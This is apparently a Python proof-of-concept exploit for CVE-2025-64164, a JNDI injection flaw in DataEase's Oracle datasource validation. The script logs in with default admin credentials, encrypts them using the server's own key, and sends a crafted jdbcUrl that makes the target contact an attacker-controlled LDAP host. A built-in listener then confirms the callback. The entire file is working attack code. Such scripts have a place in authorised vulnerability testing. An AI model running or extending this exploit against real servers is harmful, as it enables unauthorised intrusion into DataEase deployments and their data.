#!/usr/bin/env python3

import argparse
import json
import sys
import time
import threading
import socket
import base64
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

requests.packages.urllib3.disable_warnings()


class LDAPReferenceServer(threading.Thread):
    def __init__(self, port):
        super().__init__(daemon=True)
        self.port = port
        self.received_connection = False
        self.sock = None

    def run(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", self.port))
        self.sock.listen(1)
        self.sock.settimeout(30)
        print(f"[*] LDAP server listening on port {self.port}")
        try:
            conn, addr = self.sock.accept()
            print(f"[+] JNDI CALLBACK RECEIVED from {addr[0]}:{addr[1]}")
            self.received_connection = True
            data = conn.recv(1024)
            if data:
                print(f"[+] Received LDAP data ({len(data)} bytes)")
            conn.close()
        except socket.timeout:
            print("[-] No connection received within timeout")
        except Exception as e:
            print(f"[-] LDAP server error: {e}")
        finally:
            if self.sock:
                self.sock.close()


def get_dekey(target):
    url = f"{target}/de2api/dekey"
    try:
        resp = requests.get(url, verify=False, timeout=30)
        if resp.status_code == 200:
            result = resp.json()
            if result.get("code") == 0:
                return result.get("data")
    except Exception as e:
        print(f"[-] Get dekey error: {e}")
    return None


def decrypt_public_key(dekey):
    separator = base64.b64encode(b'-pk_separator-').decode('utf-8')
    parts = dekey.split(separator)
    if len(parts) != 2:
        return None
    k1, k2 = parts
    try:
        iv = b'0000000000000000'
        key = k2.encode('utf-8')
        if len(key) < 16:
            key = key.ljust(16, b'\x00')
        elif len(key) > 16:
            key = key[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(base64.b64decode(k1))
        pk = unpad(decrypted, AES.block_size).decode('utf-8')
        return pk
    except Exception as e:
        print(f"[-] Decrypt public key error: {e}")
        return None


def rsa_encrypt(data, public_key_b64):
    der_data = base64.b64decode(public_key_b64)
    key = RSA.import_key(der_data)
    cipher = PKCS1_v1_5.new(key)
    encrypted = cipher.encrypt(data.encode('utf-8'))
    return base64.b64encode(encrypted).decode('utf-8')


def login(target, username, password):
    dekey = get_dekey(target)
    if not dekey:
        print("[-] Failed to get dekey")
        return None
    
    public_key = decrypt_public_key(dekey)
    if not public_key:
        print("[-] Failed to decrypt public key")
        return None
    
    encrypted_name = rsa_encrypt(username, public_key)
    encrypted_pwd = rsa_encrypt(password, public_key)
    
    url = f"{target}/de2api/login/localLogin"
    data = {"name": encrypted_name, "pwd": encrypted_pwd, "origin": 0}
    headers = {"Content-Type": "application/json"}
    
    try:
        resp = requests.post(url, json=data, headers=headers, verify=False, timeout=30)
        if resp.status_code == 200:
            result = resp.json()
            if result.get("code") == 0:
                token = result.get("data", {}).get("token")
                if token:
                    print(f"[+] Login successful")
                    return token
        print(f"[-] Login failed: {resp.text[:200]}")
    except Exception as e:
        print(f"[-] Login error: {e}")
    return None


def exploit_jndi(target, token, ldap_url):
    url = f"{target}/de2api/datasource/validate"
    headers = {
        "Content-Type": "application/json",
        "X-DE-TOKEN": token
    }
    
    configuration = {
        "urlType": "jdbcUrl",
        "jdbcUrl": f"jdbc:oracle:thin:@{ldap_url}/cn=Exploit,dc=example,dc=com",
        "schema": "SYSTEM",
        "username": "system",
        "password": "test",
    }
    
    config_b64 = base64.b64encode(json.dumps(configuration).encode('utf-8')).decode('utf-8')
    
    payload = {
        "id": None,
        "pid": 0,
        "name": "exploit_test",
        "nodeType": "datasource",
        "type": "oracle",
        "configuration": config_b64
    }
    
    print(f"[*] Sending JNDI injection payload...")
    print(f"[*] JNDI URL in jdbcUrl: {ldap_url}")
    
    try:
        resp = requests.post(url, json=payload, headers=headers, verify=False, timeout=30)
        return resp
    except requests.exceptions.ReadTimeout:
        print("[*] Request timeout (expected behavior for JNDI lookup)")
        return None
    except Exception as e:
        print(f"[-] Exploit error: {e}")
        return None


def check_vulnerability(target, token, callback_host, callback_port):
    ldap_server = LDAPReferenceServer(callback_port)
    ldap_server.start()
    
    time.sleep(1)
    
    ldap_url = f"ldap://{callback_host}:{callback_port}"
    resp = exploit_jndi(target, token, ldap_url)
    
    time.sleep(5)
    
    if ldap_server.received_connection:
        print("[+] VULNERABILITY CONFIRMED: Received JNDI lookup callback!")
        return True
    else:
        print("[-] No callback received.")
        if resp:
            print(f"[*] Response status: {resp.status_code}")
            try:
                result = resp.json()
                print(f"[*] Response: code={result.get('code')}, msg={result.get('msg', '')[:100]}")
            except:
                print(f"[*] Response body: {resp.text[:200]}")
        return False


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-64164 DataEase Oracle JNDI Injection PoC")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://192.168.1.100:8100)")
    parser.add_argument("-u", "--username", default="admin", help="DataEase username (default: admin)")
    parser.add_argument("-p", "--password", default="DataEase@123456", help="DataEase password (default: DataEase@123456)")
    parser.add_argument("-c", "--callback", required=True, help="Callback host IP (reachable from target)")
    parser.add_argument("--port", type=int, default=1389, help="Callback port for LDAP server (default: 1389)")
    
    args = parser.parse_args()
    
    target = args.target.rstrip("/")
    
    print("=" * 60)
    print("CVE-2025-64164 DataEase Oracle JNDI Injection PoC")
    print("=" * 60)
    print(f"[*] Target: {target}")
    print(f"[*] Callback: {args.callback}:{args.port}")
    print()
    
    print("[*] Step 1: Logging in to DataEase...")
    token = login(target, args.username, args.password)
    if not token:
        print("[-] Failed to login. Cannot proceed.")
        sys.exit(1)
    
    print()
    print("[*] Step 2: Starting LDAP callback server and sending exploit...")
    vulnerable = check_vulnerability(target, token, args.callback, args.port)
    
    print()
    print("=" * 60)
    if vulnerable:
        print("[+] Target is VULNERABLE to CVE-2025-64164")
        print("[+] Oracle JDBC JNDI injection via custom jdbcUrl confirmed!")
    else:
        print("[-] Target does not appear to be vulnerable")
    print("=" * 60)
    
    return 0 if vulnerable else 1


if __name__ == "__main__":
    sys.exit(main())
